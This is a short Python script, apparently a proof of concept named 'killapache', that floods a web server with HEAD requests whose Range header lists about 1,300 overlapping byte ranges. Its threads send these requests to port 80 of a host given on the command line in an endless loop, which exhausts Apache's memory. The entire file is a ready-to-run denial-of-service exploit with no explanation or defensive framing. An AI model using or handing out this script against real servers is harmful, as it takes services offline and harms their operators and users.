import threading
import socket,time,sys,random

ti=0
NUMFORK=0
host=0

try:
    host=sys.argv[1]
    NUMFORK=sys.argv[2]
    ti=sys.argv[3]
except IndexError:
    if not ti: ti=0.1
    if not host: host="localhost"
    if not NUMFORK: NUMFORK=10

p=",".join(["5-"+str(x) for x in range(6,1300)])
req="HEAD / HTTP/1.1\r\nHost: "+host+"\r\nRange:bytes=0-1299,"+p+"\r\nAccept-Encoding: gzip\r\nConnection: close\r\n\r\n"
print req

class killapache(threading.Thread):
    def __init__(self):
        threading.Thread.__init__(self)
        self.setDaemon(True)

    def run(self):
        while True:
            s=socket.socket()
            s.connect((host,80))
            s.send(req)
            s.close()
            time.sleep(float(ti))

if __name__ == "__main__":
    workers=[]
    for i in range(int(NUMFORK)):
        t = killapache()
        workers.append(t)
    for w in workers:
        w.start()
    while True:
        time.sleep(30)